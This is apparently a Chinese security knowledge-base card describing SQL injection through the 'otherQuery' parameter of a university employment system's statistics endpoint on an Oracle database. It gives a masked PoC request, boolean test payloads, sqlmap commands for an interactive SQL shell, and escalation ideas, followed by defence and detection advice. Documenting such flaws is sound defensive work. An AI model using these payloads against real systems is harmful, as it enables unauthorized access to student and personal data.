---
id: web-generic-sqli-edu-employment-otherquery-oracle-sql-shell
title: edu 就业系统统计查询 otherQuery 参数 SQL 注入：Oracle 后端 sqlmap 获取交互式 SQL shell
type: scenario
domain: web
path: web/generic/sqli
technique: otherquery-param-oracle-sqli
tags:
- web
- sqli
- oracle
- post
- sqlmap
- education
- statistics
cve: []
severity: high
confidence: medium
status: verified
created: '2026-11-07'
updated: '2026-11-07'
verification:
  verified_by: verifier-V213
  verified_at: '2026-11-07T04:39:02+08:00'
  notes: 已对照原文案例二与 img/14、16、18、20 核对：就业平台统计 POST 的 otherQuery 直接拼接、Burp 请求字段与原文字段一致、sqlmap sql-shell 枚举 all_users 成功；原文未给出完整 sqlmap 命令，卡已按通用用法补全并标 confidence=medium，保留。
url: /docs/web/generic/sqli/web-generic-sqli-edu-employment-otherquery-oracle-sql-shell/
draft: false
kb_aliases:
- otherQuery SQL 注入
- 就业系统 SQL 注入
- Oracle sql-shell
- 统计查询注入
- edu SQL 注入
---

## 一句话结论

edu 就业综合管理平台的统计查询接口把客户端提交的 `otherQuery` 参数直接拼进 SQL 查询，登录用户即可注入；后端为 Oracle，sqlmap 确认后可用 `--sql-shell` 执行任意 SQL，枚举 `all_users` 等系统视图。

## 原理

- **动态统计查询**：就业系统的统计模块需要按院系、专业、届别、自定义条件等动态组合查询，后端往往把多个表单字段（`field_id`、`field_text`、`data_field_query`、`data_field_hcur_val`、`order_field`、`order_type`、`otherQuery` 等）拼接成 SQL 的 WHERE/ORDER BY 片段。
- **`otherQuery` 是原始 SQL 片段**：该参数的设计目的就是让前端追加“其他条件”，服务端未做参数化或白名单，直接拼接到语句中，因此 `and ...` 等布尔/报错/时间条件都会进入数据库执行。
- **Oracle 后端**：从 sqlmap 枚举 `SELECT username FROM all_users ORDER BY username` 成功可确认数据库为 Oracle；注入点可用 Oracle 的布尔、报错、时间盲注技术，sqlmap 的 `--sql-shell` 能直接执行 SQL。
- **为什么危害高**：数据库账号权限通常较高，SQL shell 可读取业务表（学生/就业/身份证等）、系统视图，甚至进一步尝试文件读写/命令执行（取决于 Oracle 账号权限与数据库配置）。

## 触发条件

- 目标为 edu 就业系统或类似统计平台，存在接收多字段查询条件的 POST 接口。
- 攻击者拥有普通登录账号（学生/教师），能访问统计或报表页面。
- 接口把 `otherQuery` 等参数直接拼接到 SQL；后端为 Oracle；无有效 WAF/参数化。
- 数据库账号不是最小权限只读账号，或至少能读取敏感业务表。

## 利用步骤

1. 登录就业系统，进入个人中心/统计页面，用 Burp 抓取统计查询的 POST 请求。
2. 分析请求体字段：`tab`、`field_id`、`field_text`、`up_file_id`、`up_file_val`、`data_field_query`、`data_field_hcur_val`、`order_field`、`order_type`、`otherQuery`；重点测试 `otherQuery`。
3. 在 `otherQuery` 中追加布尔条件（如 `and 1=1` / `and 1=2`）、引号、`order by` 等，比较响应长度/内容/报错差异，确认注入。
4. 用 sqlmap 读取该请求（`-r request.txt -p otherQuery --dbms Oracle`），确认注入类型并获取数据库信息。
5. 使用 `--sql-shell` 执行 `SELECT username FROM all_users ORDER BY username` 等查询，枚举数据库账号与业务表；按授权范围控制查询。
6. 如需扩大影响，评估当前 Oracle 账号的权限（读文件、JAVA 权限、DBA 视图等），但避免破坏性操作。

## PoC

请求模板（字段名来自文章截图，值已打码）：

```http
POST /<employment-path>/<statistics-endpoint> HTTP/1.1
Host: target.edu.cn
Content-Type: application/x-www-form-urlencoded; charset=UTF-8
X-Requested-With: XMLHttpRequest
Cookie: <session>

tab=<table>&field_id=dm&field_text=name&up_file_id=fid&up_file_val=1&
data_field_query=ssdm&data_field_hcur_val=id&order_field=&order_type=&
otherQuery=and+1%3D1
```

sqlmap 利用（在授权范围内）：

```bash
sqlmap -r request.txt -p otherQuery --dbms Oracle --batch
sqlmap -r request.txt -p otherQuery --dbms Oracle --sql-shell
```

sql-shell 中可执行：

```sql
SELECT username FROM all_users ORDER BY username;
```

文章实测通过该注入获得 Oracle 交互式 SQL shell，并枚举出数据库用户列表。

## 变体与关联

- **参数名变体**：不同统计模块可能用 `otherQuery`、`otherSql`、`where`、`filter`、`orderBy`、`sort` 等；凡是“拼接 SQL 片段”的参数都可能注入。
- **注入类型**：Oracle 下可尝试布尔盲注、报错注入（`dbms_xdb`/`utl_inaddr` 等）、时间盲注；sqlmap 会自动识别。
- **权限扩展**：若数据库账号具备 `UTL_FILE`、`JAVA` 权限或 DBA 角色，可进一步读写文件/执行命令；测试时先确认权限，避免高危操作。
- **关联**：[[web-generic-sqli-dotnet-oracle-error-dbms-xdb-checkin]]（Oracle 报错注入案例）、[[web-generic-sqli-fastcms-article-list-orderby-injection]]（排序注入）、[[web-generic-sqli-json-where-builder-colname-colvalue]]（查询构造器注入）、[[web-generic-sqli-aspnet-webforms-report-txtwhere-mssql]]（WHERE 片段参数注入的另一个案例）。

## 检测与防御

- **参数化查询**：所有用户输入必须绑定参数，不得把 `otherQuery` 等字符串直接拼进 SQL；动态表名/列名/排序字段使用服务端白名单。
- **最小权限**：统计查询使用只读、仅能访问必要视图/表的数据库账号，禁用 `UTL_FILE`、`JAVA`、DBA 等能力。
- **输入校验**：对排序方向、字段名、条件表达式做结构化解析，而不是黑名单过滤。
- **检测**：监控统计接口中引号、`and/or`、`order by`、`union`、`dbms_` 等特征；对同一账号高频异常查询、响应长度差异大做告警；部署 WAF 作为补充。
- **响应**：确认注入后修复接口、轮换数据库凭据、评估数据泄露范围。
